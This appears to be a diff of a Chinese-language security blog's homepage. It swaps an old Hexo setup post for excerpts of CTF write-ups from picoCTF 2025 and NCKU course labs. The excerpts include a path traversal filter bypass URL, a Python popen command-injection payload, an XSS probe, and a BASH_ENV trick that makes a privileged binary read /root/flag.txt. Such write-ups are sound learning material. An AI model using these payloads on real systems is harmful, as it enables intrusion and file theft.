@@ -1,379 +1,717 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-TW">
 <head>
-  <meta charset="utf-8">
-  
-  
-  <title>Owl NoSleep Blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="分享資訊安全、CTF競賽、程式開發的學習心得與技術筆記">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Owl NoSleep Blog">
-<meta property="og:url" content="https://owld.tw/index.html">
-<meta property="og:site_name" content="Owl NoSleep Blog">
-<meta property="og:description" content="分享資訊安全、CTF競賽、程式開發的學習心得與技術筆記">
-<meta property="og:locale" content="zh_TW">
-<meta property="article:author" content="Owl NoSleep">
-<meta property="article:tag" content="資訊安全,CTF,網路安全,程式開發,學習筆記">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Owl NoSleep Blog" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+    <meta charset="utf-8" />
+    <title>OWL_D Blog</title>
+    <meta name="author" content="owl_d" />
+    <meta name="description" content="專注於網路安全、滲透測試和技術分享的技術部落格" />
+    <meta name="keywords" content="網路安全, 滲透測試, CTF, 技術分享, 資安" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
 
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+<script src="/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/css/main.css" />
 
 <meta name="generator" content="Hexo 7.3.0"></head>
-
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Owl NoSleep Blog</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">資訊安全學習筆記</a>
-        </h2>
-      
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>載入過慢請開啟緩存 瀏覽器預設開啟</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>OWL_D BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;OWL_D BLOG</span>
+        </div>
+        <a href="/archives/" class="mobile-search-link">
+            <i class="fa-solid fa-magnifying-glass fa-fw"></i>
+        </a>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div id="home-head">
+    <div
+        id="home-background"
+        ref="homeBackground"
+        data-images="/images/background.jpg"
+    ></div>
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>OWL_D Blog</h1>
+                <h3>網路安全與技術探索</h3>
+                <h5>專注於網路安全、滲透測試和技術分享的技術部落格</h5>
+            </div>
+        </span>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+</div>
+<div
+    id="home-posts-wrap"
+    ref="homePostsWrap"
+    true
+>
+    <div id="home-posts">
         
-          <a class="main-nav-link" href="/">Home</a>
+
+<div class="post">
+    <a href="/2025/03/26/%E4%BD%9C%E6%A5%AD%E4%BA%8C-write-up/">
+        <h2 class="post-title">【網路安全實務與社會實踐】作業二 Write-up</h2>
+    </a>
+    <div class="category-and-date">
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
         
-      </nav>
-      <nav id="sub-nav">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/3/26
+        </span>
         
         
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="搜尋"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜尋"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://owld.tw"></form>
-      </div>
     </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-Hexo-Website-Setup-Complete" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/06/29/Hexo-Website-Setup-Complete/" class="article-date">
-  <time class="dt-published" datetime="2025-06-29T08:32:10.000Z" itemprop="datePublished">2025-06-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">資訊安全</a>►<a class="article-category-link" href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/">學習筆記</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="作業二-Write-up-by-owl-d"><a href="#作業二-Write-up-by-owl-d" class="headerlink" title="作業二 Write-up by owl_d"></a>作業二 Write-up by owl_d</h1><h3 id="pathwalker-waf2"><a href="#pathwalker-waf2" class="headerlink" title="pathwalker-waf2"></a>pathwalker-waf2</h3><p>發現這題的path traversal重點在這個區間</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">      if (isset($_GET[&#x27;page&#x27;])) &#123;</span><br><span class="line">        $safe_path = str_replace(&#x27;../&#x27;, &#x27;&#x27;, $_GET[&#x27;page&#x27;]);</span><br><span class="line">        echo file_get_contents(&quot;./page/&quot;.$safe_path.&quot;.php&quot;);</span><br><span class="line">      &#125;      </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+<p>程式只有把 ..&#x2F; 換掉<br>所以可以使用 …&#x2F;.&#x2F; 的方式來 bypass<br>…&#x2F;.&#x2F; 被換掉後會變成 ..&#x2F; 就一樣可以達成回到上一層的目的</p>
+<p><code>https://chall.nckuctf.org:28142/?page=..././..././..././..././var/www/html/flag</code><br>即取得flag</p>
+<p>p.s. 這題沒辦法用 ..%2f 的方式來bypass，會被當成 ..&#x2F; 過濾掉</p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/06/29/Hexo-Website-Setup-Complete/">Hexo 網站建立完成！</a>
-    </h1>
-  
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #00bcd4">CTF</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/CyberSecurity/" style="color: #ffa2c4">CyberSecurity</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/NCKUCTF/" style="color: #03a9f4">NCKUCTF</a>
+        </span>
+        
+    </div>
+    <a href="/2025/03/26/%E4%BD%9C%E6%A5%AD%E4%BA%8C-write-up/" class="go-post">閱讀全文</a>
+</div>
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="🎉-Hexo-網站成功建立！"><a href="#🎉-Hexo-網站成功建立！" class="headerlink" title="🎉 Hexo 網站成功建立！"></a>🎉 Hexo 網站成功建立！</h1><p>恭喜！您的 Hexo 個人技術部落格已經成功建立並配置完成。</p>
-<h2 id="📋-已完成的配置"><a href="#📋-已完成的配置" class="headerlink" title="📋 已完成的配置"></a>📋 已完成的配置</h2><h3 id="✅-基本設置"><a href="#✅-基本設置" class="headerlink" title="✅ 基本設置"></a>✅ 基本設置</h3><ul>
-<li><strong>網站標題</strong>: Owl NoSleep Blog</li>
-<li><strong>副標題</strong>: 資訊安全學習筆記</li>
-<li><strong>語言</strong>: 繁體中文 (zh-TW)</li>
-<li><strong>時區</strong>: Asia&#x2F;Taipei</li>
-<li><strong>域名</strong>: <a href="https://owld.tw/">https://owld.tw</a></li>
-</ul>
-<h3 id="✅-部署配置"><a href="#✅-部署配置" class="headerlink" title="✅ 部署配置"></a>✅ 部署配置</h3><ul>
-<li><strong>GitHub Repository</strong>: owl-nosleep&#x2F;owl-nosleep.github.io</li>
-<li><strong>部署分支</strong>: main</li>
-<li><strong>自動部署</strong>: 已配置 hexo-deployer-git</li>
-</ul>
-<h3 id="✅-目錄結構"><a href="#✅-目錄結構" class="headerlink" title="✅ 目錄結構"></a>✅ 目錄結構</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">owl-nosleep-source/     # Hexo 源碼目錄</span><br><span class="line">├── source/_posts/      # 文章目錄</span><br><span class="line">├── _config.yml         # 主配置文件</span><br><span class="line">└── themes/             # 主題目錄</span><br><span class="line"></span><br><span class="line">owl-nosleep.github.io/  # GitHub Pages 部署目錄</span><br><span class="line">├── index.html          # 生成的首頁</span><br><span class="line">├── CNAME              # 域名配置</span><br><span class="line">└── ...                # 其他靜態文件</span><br></pre></td></tr></table></figure>
+<div class="post">
+    <a href="/2025/03/11/picoctf-2025-write-ups/">
+        <h2 class="post-title">picoCTF 2025 write-ups</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/3/11
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="picoCTF-2025-write-ups"><a href="#picoCTF-2025-write-ups" class="headerlink" title="picoCTF 2025 write-ups"></a>picoCTF 2025 write-ups</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="3v-l"><a href="#3v-l" class="headerlink" title="3v@l"></a>3v@l</h3><p>payload: getattr(<strong>import</strong>(‘o’+’s’), ‘po’+’pen’)(‘tac${IFS}’+chr(47)+’fl*’).read()</p>
+<h3 id="SSTI2"><a href="#SSTI2" class="headerlink" title="SSTI2"></a>SSTI2</h3><p>payload: </p>
+<h3 id="WebSockFish"><a href="#WebSockFish" class="headerlink" title="WebSockFish"></a>WebSockFish</h3><p>在console裡面控制遊戲</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">game.load(&quot;8/8/8/8/8/8/8/R7 w - - 0 1&quot;);</span><br><span class="line">true</span><br><span class="line">board.position(game.fen());</span><br><span class="line">undefined</span><br><span class="line">makeBestMove();</span><br><span class="line">undefined</span><br><span class="line">ws.send(&quot;mate 0&quot;);</span><br><span class="line">undefined</span><br><span class="line">3verbal-sleep.picoctf.net/:1 Uncaught (in promise) Error: A listener indicated an asynchronous response by returning true, but the message channel closed before a response was received</span><br><span class="line">sendMessage(&quot;mate -1&quot;)  // 表示AI被將軍，1步內輸掉</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval -9999&quot;)  // 表示AI處於極其不利的局面</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;mate -1&quot;)  // </span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval 12&quot;)  // </span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval -10&quot;)  // </span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">sendMessage(&quot;eval -999999999999999&quot;)  // 這樣才是win in a convincing manner</span><br><span class="line"></span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
 
-<h2 id="🚀-下一步該做什麼？"><a href="#🚀-下一步該做什麼？" class="headerlink" title="🚀 下一步該做什麼？"></a>🚀 下一步該做什麼？</h2><h3 id="1-本地預覽"><a href="#1-本地預覽" class="headerlink" title="1. 本地預覽"></a>1. 本地預覽</h3><p>您的網站現在正在 <code>http://localhost:4000</code> 上運行，可以在瀏覽器中查看效果。</p>
-<h3 id="2-創建新文章"><a href="#2-創建新文章" class="headerlink" title="2. 創建新文章"></a>2. 創建新文章</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hexo new <span class="string">&quot;我的第一篇文章&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Apriti-sesamo"><a href="#Apriti-sesamo" class="headerlink" title="Apriti sesamo"></a>Apriti sesamo</h3><p>emacs 代表可以在網址後加一個 ~<br>會發現網頁原始碼有隱藏的判斷邏輯程式碼<br>發現其實就是SHA1 collision</p>
+<p><img src="/images/apriti_sesamo_image1.png" alt="image"></p>
+<h3 id="Hash-only-1"><a href="#Hash-only-1" class="headerlink" title="Hash-only 1"></a>Hash-only 1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ echo &#x27;cat /root/flag.txt&#x27; &gt; /tmp/exploit.sh</span><br><span class="line">ctf-player@pico-chall$ export BASH_ENV=/tmp/exploit.sh</span><br><span class="line">ctf-player@pico-chall$ ./flaghasher</span><br><span class="line">Computing the MD5 hash of /root/flag.txt....</span><br><span class="line"></span><br><span class="line">picoCTF&#123;sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_ae1d8678&#125;4d4f660d53535446f15c1a3a7b535e50  /root/flag.txt</span><br></pre></td></tr></table></figure>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/picoCTF/" style="color: #03a9f4">picoCTF</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #ffa2c4">CTF</a>
+        </span>
+        
+    </div>
+    <a href="/2025/03/11/picoctf-2025-write-ups/" class="go-post">閱讀全文</a>
+</div>
 
-<h3 id="3-編輯文章"><a href="#3-編輯文章" class="headerlink" title="3. 編輯文章"></a>3. 編輯文章</h3><p>文章會保存在 <code>source/_posts/</code> 目錄下，使用 Markdown 語法編寫。</p>
-<h3 id="4-生成並部署"><a href="#4-生成並部署" class="headerlink" title="4. 生成並部署"></a>4. 生成並部署</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hexo generate &amp;&amp; npx hexo deploy</span><br></pre></td></tr></table></figure>
+<div class="post">
+    <a href="/2025/03/08/xss-cheatsheat/">
+        <h2 class="post-title">XSS Cheatsheat</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/3/8
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="XSS-Cheatsheet"><a href="#XSS-Cheatsheet" class="headerlink" title="XSS Cheatsheet"></a>XSS Cheatsheet</h1><h3 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h3><p><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code> : 先測試有沒有辦法送指令進去</p>
 
-<h2 id="📝-寫作技巧"><a href="#📝-寫作技巧" class="headerlink" title="📝 寫作技巧"></a>📝 寫作技巧</h2><h3 id="Front-Matter-模板"><a href="#Front-Matter-模板" class="headerlink" title="Front Matter 模板"></a>Front Matter 模板</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">文章標題</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2025-01-01 12:00:00</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">資訊安全</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">學習筆記</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">CTF</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">網路安全</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/XSS/" style="color: #00a596">XSS</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Notes/" style="color: #03a9f4">Notes</a>
+        </span>
+        
+    </div>
+    <a href="/2025/03/08/xss-cheatsheat/" class="go-post">閱讀全文</a>
+</div>
 
-<h3 id="常用-Markdown-語法"><a href="#常用-Markdown-語法" class="headerlink" title="常用 Markdown 語法"></a>常用 Markdown 語法</h3><ul>
-<li><code># 標題</code> - 一級標題</li>
-<li><code>**粗體**</code> - <strong>粗體文字</strong></li>
-<li><code>*斜體*</code> - <em>斜體文字</em></li>
-<li><code>`代碼`</code> - <code>行內代碼</code></li>
-<li><code>[連結](URL)</code> - <a target="_blank" rel="noopener" href="https://example.com/">連結文字</a></li>
-</ul>
-<h3 id="代碼區塊"><a href="#代碼區塊" class="headerlink" title="代碼區塊"></a>代碼區塊</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, Hexo!&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h2 id="🔧-常用命令速記"><a href="#🔧-常用命令速記" class="headerlink" title="🔧 常用命令速記"></a>🔧 常用命令速記</h2><table>
-<thead>
-<tr>
-<th>命令</th>
-<th>說明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>npx hexo new &quot;標題&quot;</code></td>
-<td>創建新文章</td>
-</tr>
-<tr>
-<td><code>npx hexo server</code></td>
-<td>啟動本地服務器</td>
-</tr>
-<tr>
-<td><code>npx hexo generate</code></td>
-<td>生成靜態文件</td>
-</tr>
-<tr>
-<td><code>npx hexo deploy</code></td>
-<td>部署到 GitHub Pages</td>
-</tr>
-<tr>
-<td><code>npx hexo clean</code></td>
-<td>清理緩存</td>
-</tr>
-</tbody></table>
-<h2 id="🎯-建議的發文主題"><a href="#🎯-建議的發文主題" class="headerlink" title="🎯 建議的發文主題"></a>🎯 建議的發文主題</h2><p>根據您現有的分類和標籤，建議可以寫以下主題的文章：</p>
+<div class="post">
+    <a href="/2025/03/07/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8%E5%AF%A6%E5%8B%99%E8%88%87%E7%A4%BE%E6%9C%83%E5%AF%A6%E8%B8%90%E4%BD%9C%E6%A5%AD%E4%B8%80/">
+        <h2 class="post-title">【網路安全實務與社會實踐】作業一 Write-up</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/3/7
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="【網路安全實務與社會實踐】作業一"><a href="#【網路安全實務與社會實踐】作業一" class="headerlink" title="【網路安全實務與社會實踐】作業一"></a>【網路安全實務與社會實踐】作業一</h1><blockquote>
+<p>此次 Lab 共為兩題</p>
 <ol>
-<li><p><strong>CTF 競賽 Write-ups</strong></p>
+<li>phpisnice <a target="_blank" rel="noopener" href="https://class.nckuctf.org/challenges#phpisnice-12">https://class.nckuctf.org/challenges#phpisnice-12</a></li>
+<li>phpisbest <a target="_blank" rel="noopener" href="https://class.nckuctf.org/challenges#phpisbest-13">https://class.nckuctf.org/challenges#phpisbest-13</a></li>
+</ol>
+</blockquote>
+<h3 id="phpisnice"><a href="#phpisnice" class="headerlink" title="phpisnice"></a>phpisnice</h3><p>先看一下網頁給的資訊</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">$A = $_GET[&#x27;A&#x27;];</span><br><span class="line">$B = $_GET[&#x27;B&#x27;];</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($A) &amp;&amp; isset($B))</span><br><span class="line">    if ($A != $B)</span><br><span class="line">        if (strcmp($A, $B) == 0)</span><br><span class="line">            if (md5($A) == md5($B))</span><br><span class="line">                echo $flag;</span><br><span class="line">            else die(&#x27;ERROR: MD5(A) != MD5(B)&#x27;);</span><br><span class="line">        else die(&#x27;ERROR: strcmp(A, B) != 0&#x27;);</span><br><span class="line">    else die(&#x27;ERROR: A == B&#x27;);</span><br><span class="line">else die(&#x27;ERROR: A, B should be given&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>可以看出題目要求：<code>要求找到一個值 A，使得 md5(A) == A</code><br>所以這題是標準的「md5碰撞」</p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/CTF/" style="color: #ffa2c4">CTF</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/CyberSecurity/" style="color: #ff7d73">CyberSecurity</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/NCKUCTF/" style="color: #00a596">NCKUCTF</a>
+        </span>
+        
+    </div>
+    <a href="/2025/03/07/%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8%E5%AF%A6%E5%8B%99%E8%88%87%E7%A4%BE%E6%9C%83%E5%AF%A6%E8%B8%90%E4%BD%9C%E6%A5%AD%E4%B8%80/" class="go-post">閱讀全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/02/04/pwn-%E6%95%99%E5%AD%B8%E6%8C%87%E5%8D%97/">
+        <h2 class="post-title">PWN 教學指南</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                資訊安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/2/4
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>重點包括：</p>
 <ul>
-<li>解題思路和技巧分享</li>
-<li>工具使用心得</li>
+<li><strong>基礎知識與概念</strong>（PWN 是什麼、CTF 題型介紹）</li>
+<li><strong>必要技能</strong>（逆向工程、漏洞分析、各類漏洞原理）</li>
+<li><strong>工具介紹</strong>（GDB、IDA Pro、pwntools、Radare2 等）</li>
+<li><strong>實戰案例</strong>（著名攻擊案例與 CTF 題目解析）</li>
+<li><strong>進階技巧</strong>（ROP、Heap Exploitation、Kernel Exploitation 等）</li>
+<li><strong>學習資源</strong>（免費與付費資源，包括影片與文字教學）</li>
 </ul>
-</li>
-<li><p><strong>資訊安全學習筆記</strong></p>
-<ul>
-<li>Web 安全 (XSS, SQLi 等)</li>
-<li>Binary Exploitation (pwn)</li>
-<li>滲透測試技術</li>
-</ul>
-</li>
-<li><p><strong>技術教學文章</strong></p>
-<ul>
-<li>工具安裝與配置</li>
-<li>程式開發經驗</li>
